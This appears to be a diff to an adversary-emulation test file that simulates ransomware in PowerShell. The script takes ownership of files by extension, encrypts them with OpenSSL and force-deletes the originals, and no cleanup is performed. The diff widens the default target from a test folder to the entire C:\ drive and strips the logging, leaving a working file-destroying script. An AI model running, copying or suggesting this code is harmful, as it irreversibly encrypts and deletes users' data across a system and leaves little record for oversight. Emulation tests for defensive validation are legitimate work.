@@ -16,7 +16,7 @@ atomic_tests:
       target_directory:
         description: Directory to encrypt and delete files from
         type: path
-        default: "C:\\TestFolder"
+        default: "C:\\"
       target_extensions:
         description: List of file extensions to target for encryption
         type: array
@@ -88,74 +88,55 @@ atomic_tests:
       name: powershell
       elevation_required: true
       command: |
-        # Start logging all output to a file
-        $logFile = "$env:TEMP\encryption_log.txt"
-        Start-Transcript -Path $logFile -Append | Out-Null
+        $password = "#{encryption_password}"
+        $targetDir = "#{target_directory}"
+        $targetExtensions = "#{target_extensions}".Split(",")
 
-        try {
-            $password = "#{encryption_password}"
-            $targetDir = "#{target_directory}"
-            $targetExtensions = "#{target_extensions}".Split(",")
+        # Convert extensions to a format suitable for PowerShell filtering
+        $includeClause = $targetExtensions | ForEach-Object { "*$_" } -join ","
 
-            # Convert extensions to a format suitable for PowerShell filtering
-            $includeClause = $targetExtensions | ForEach-Object { "*$_" } -join ","
-
-            # Validate target directory
-            if (-Not (Test-Path $targetDir)) {
-                Write-Host "❌ ERROR: The target directory $targetDir does not exist."
-                exit 1
-            }
-
-            Write-Host "✅ Starting encryption process..."
-
-            # Encrypt files recursively
-            Get-ChildItem -Path $targetDir -Recurse -Include $includeClause -ErrorAction SilentlyContinue | ForEach-Object {
-                $file = $_.FullName
-
-                # Log the current file being processed
-                Write-Host "🔍 Processing file: $file"
-
-                # Check if the file exists
-                if (-Not (Test-Path $file)) {
-                    Write-Host "❌ ERROR: File not found: $file"
-                    return
-                }
-
-                # Take ownership and modify permissions (suppress prompts)
-                try {
-                    takeown /F $file /A /Q
-                    icacls $file /grant Administrators:F /T /C /Q
-                    Write-Host "🔑 Permissions modified successfully for: $file"
-                } catch {
-                    Write-Host "❌ ERROR: Failed to modify permissions for file: $file"
-                    return
-                }
-
-                # Encrypt the file with OpenSSL
-                $encryptedFile = "$file.enc"
-                Write-Host "🔒 Encrypting file: $file -> $encryptedFile"
-                
-                # Execute OpenSSL command and capture output
-                $opensslOutput = openssl enc -aes-256-cbc -salt -pbkdf2 -iter 10000 -in $file -out $encryptedFile -pass pass:$password 2>&1
-                
-                if ($LASTEXITCODE -eq 0) {
-                    Write-Host "✅ Successfully encrypted: $file -> $encryptedFile"
-                    
-                    # Delete the original file after successful encryption (suppress prompts)
-                    Remove-Item -Path $file -Force -Confirm:$false
-                    Write-Host "🗑️ Deleted original file: $file"
-                } else {
-                    Write-Host "❌ ERROR: Failed to encrypt: $file"
-                    Write-Host "OpenSSL Output: $opensslOutput"
-                }
-            }
-
-            Write-Host "✅ Encryption and deletion process completed!"
-        } finally {
-            # Stop logging and save the transcript
-            Stop-Transcript | Out-Null
-            Write-Host "Logs saved to: $logFile"
+        # Validate target directory
+        if (-Not (Test-Path $targetDir)) {
+            Write-Host "❌ The target directory $targetDir does not exist."
+            exit 1
         }
+
+        Write-Host "✅ Starting encryption process..."
+
+        # Encrypt files recursively
+        Get-ChildItem -Path $targetDir -Recurse -Include $includeClause -ErrorAction SilentlyContinue | ForEach-Object {
+            $file = $_.FullName
+
+            # Log the current file being processed
+            Write-Host "🔍 Processing file: $file"
+
+            # Take ownership and modify permissions
+            try {
+                takeown /F $file /A
+                icacls $file /grant Administrators:F /T /C
+                Write-Host "🔑 Permissions modified successfully for: $file"
+            } catch {
+                Write-Host "❌ Failed to modify permissions for file: $file"
+                return
+            }
+
+            # Encrypt the file with OpenSSL
+            $encryptedFile = "$file.enc"
+            Write-Host "🔒 Encrypting file: $file -> $encryptedFile"
+            openssl enc -aes-256-cbc -salt -pbkdf2 -iter 10000 -in $file -out $encryptedFile -pass pass:$password
+            
+            if ($LASTEXITCODE -eq 0) {
+                Write-Host "✅ Successfully encrypted: $file -> $encryptedFile"
+                
+                # Delete the original file after successful encryption
+                Remove-Item -Path $file -Force
+                Write-Host "🗑️ Deleted original file: $file"
+            } else {
+                Write-Host "❌ Failed to encrypt: $file"
+            }
+        }
+
+        Write-Host "✅ Encryption and deletion process completed!"
       cleanup_command: |
         Write-Host "No cleanup performed for destructive actions. To recover encrypted files, use the decryption password provided."
         # Note: Ensure that the decryption password is securely stored and accessible.
